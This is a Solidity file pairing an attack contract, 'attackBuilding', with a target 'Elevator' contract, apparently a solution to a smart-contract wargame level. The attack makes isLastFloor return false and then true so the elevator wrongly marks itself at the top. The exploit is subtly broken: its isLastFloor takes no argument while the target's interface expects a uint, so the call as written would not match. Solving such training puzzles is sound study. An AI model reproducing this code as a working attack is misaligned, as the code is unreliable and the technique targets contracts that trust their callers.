// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./Elevator.sol";

contract attackBuilding {

    Elevator elevator;
    bool public theSwitch = false;

    constructor(address _addr) {
        elevator = Elevator(_addr);
    }

    function attack() public {
        elevator.goTo(10);
    }

    function isLastFloor() public returns (bool answer) {
        if (!theSwitch) {
            theSwitch = true;
            return false;
        } else {
            theSwitch = false;
            return true;
        }
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}